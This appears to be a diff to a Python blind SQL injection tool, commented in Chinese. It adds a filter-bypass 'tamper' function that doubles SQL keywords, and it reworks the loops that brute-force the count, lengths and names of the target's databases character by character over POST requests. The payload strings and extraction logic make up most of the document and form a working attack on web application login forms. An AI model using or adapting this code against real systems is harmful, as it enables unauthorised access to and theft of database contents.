@@ -35,7 +35,7 @@ timeout=50
 database_num="admin' anandd (selselectect count(schema_name) frfromom infoorrmation_schema.schemata whewherere schema_name NOT IN ('infoorrmation_schema', 'mysql', 'perfoorrmance_schema', 'sys')) = {}#"
 
 #爆破库名ascii码值的payload
-database_size="admin' aandnd asasciicii(subsubstrstr({},{},1))={}#"
+database_size="admin' anandd ascasciiii(subsubstrstr((selselectect schema_name frfromom infoorrmation_schema.schemata whewherere schema_name NOT IN ('infoorrmation_schema', 'mysql', 'perfoorrmance_schema', 'sys') limit {},1),{},1)) = {} #"
 
 #爆破表得个数
 num_table="admin' anandd (selselectect count(TABLE_NAME) frfromom infoorrmation_schema.TABLES whewherere TABLE_SCHEMA='{}') = {}#"
@@ -64,6 +64,7 @@ len_data="admin' aandnd (selselectect length({}) frfromom {} limit {},1)={}#"
 #爆破表中的数据
 size_data="admin' aandnd asasciicii(subsubstrstr((selselectect {} frfromom {} limit {},1),{},1))={}#"
 
+
 #get请求
 def get(url,payload):
     url=url+payload
@@ -79,6 +80,22 @@ def post(url,payload,data):
     #print("你访问的url为：",url,"\t访问方式为post")
     return result
 
+#双写绕过脚本
+def tamper(payload):
+    payload= re.sub('or' , 'oorr',payload,flags=re.IGNORECASE)
+    payload= re.sub('by' , 'bbyy',payload,flags=re.IGNORECASE)
+    payload= re.sub('if' , 'iiff',payload,flags=re.IGNORECASE)
+    payload= re.sub('and' , 'anandd',payload,flags=re.IGNORECASE)
+    payload= re.sub('mid' , 'mimidd',payload,flags=re.IGNORECASE)
+    payload= re.sub('char' , 'chcharar',payload,flags=re.IGNORECASE)
+    payload= re.sub('from' , 'frfromom',payload,flags=re.IGNORECASE)
+    payload= re.sub('union' , 'uniunionon',payload,flags=re.IGNORECASE)
+    payload= re.sub('sleep' , 'slesleepep',payload,flags=re.IGNORECASE)
+    payload= re.sub('where' , 'whewherere',payload,flags=re.IGNORECASE)
+    payload= re.sub('select' , 'selselectect',payload,flags=re.IGNORECASE)
+    payload= re.sub('substr' , 'subsubstrstr',payload,flags=re.IGNORECASE)
+    retVal=payload
+    return retVal
 
 
 #搜索对应数据
@@ -118,45 +135,46 @@ def fuzz_D_len(url,method,data,num_database):
         for payload in file:
             if data==None:
                 data =''
-            len = 1
             if method =='get':
                 result = get(url,payload)
             elif method =='post':
                 #猜数据库长度
-                for num in range(num_database):
-                    while len<20:
-                        payload = (payload.replace("*",str(len))).format(num)
-                        result = post(url,payload,data)
+                for num in range(0,num_database):
+                    for len in range (1,21):
+                        payload_temp = payload.format(num,len)
+                        #payload = (payload.replace("*",str(len)))
+                        result = post(url,payload_temp,data)
                         if message not in result:
                             #print(result)
-                            print("第{}数据库的长度为：{}".format((num+1),len))
-                            database_Len_result[num] = len
+                            #print("第{}数据库的长度为：{}".format((num+1),len))
+                            database_Len_result[num] = len 
+                            #payload = payload.replace(str(len),"*")
                             break
-                        payload = payload.replace(str(len),"*")
-                        len+=1
+                        #payload = payload.replace(str(len),"*")
                 return database_Len_result
 
 #爆破数据库的ascii码值
-def fuzz_D_size(url,len,method,data):
+def fuzz_D_size(url,method,data,num_D,len):
     if data==None:
         data =''
-    time = 1
     if method =='get':
         result = get(url,payload)
     elif method =='post':
-        print("数据库名为:",end='')
-        while time <= len:
-            #payload = payload.replace("len",str(time))
-            for i in range (low,high+1):
-                #payload = payload.replace("size",str(mid))
-                payload = database_size.format(time,i)
-                result = post(url,payload,data)
-                if message not in result:
-                    print(chr(i),end='')
-                    break
-            #payload = payload.replace(str(time),"len")
-            time += 1
-        print("\n")
+        for num in range(0,num_D):
+            time = 1
+            print("第{}个数据库名为:".format(num+1),end='')
+            while time <= len[num]:
+                #payload = payload.replace("len",str(time))
+                for i in range (low,high+1):
+                    #payload = payload.replace("size",str(mid))
+                    payload = database_size.format(num,time,i)
+                    result = post(url,payload,data)
+                    if message not in result:
+                        print(chr(i),end='')
+                        break
+                #payload = payload.replace(str(time),"len")
+                time += 1
+            print("")
 
 #爆破表的数量
 def fuzz_T_num(url,method,data,database_name):
@@ -166,7 +184,7 @@ def fuzz_T_num(url,method,data,database_name):
         result = get(url,payload)
     elif method =='post':
         #猜表数量
-        for num in range(1,20):
+        for num in range(0,50):
             payload=num_table.format(database_name,num)
             result = post(url,payload,data)
             if message not in result:
@@ -337,11 +355,12 @@ def scan(url,method,data,database_name,databases,table_name,tables,column_name,c
         num_database = fuzz_D_num(url,method,data)
         print("查询到{}个数据库".format(num_database))
         #爆破数据库长度
-        len = fuzz_D_len(url,method,data,num_database)
-        for i in len:
-            print("第{}个数据库的长度为：{}".format(i+1,len[i]))
+        len_D = {}
+        len_D = fuzz_D_len(url,method,data,num_database)
+        for i in len_D:
+            print("第{}个数据库的长度为：{}".format(i+1,len_D[i]))
         #爆破数据库名
-        #fuzz_D_size(url,len,method,data)
+        fuzz_D_size(url,method,data,num_database,len_D)
         return
     if tables:
         if database_name==None:
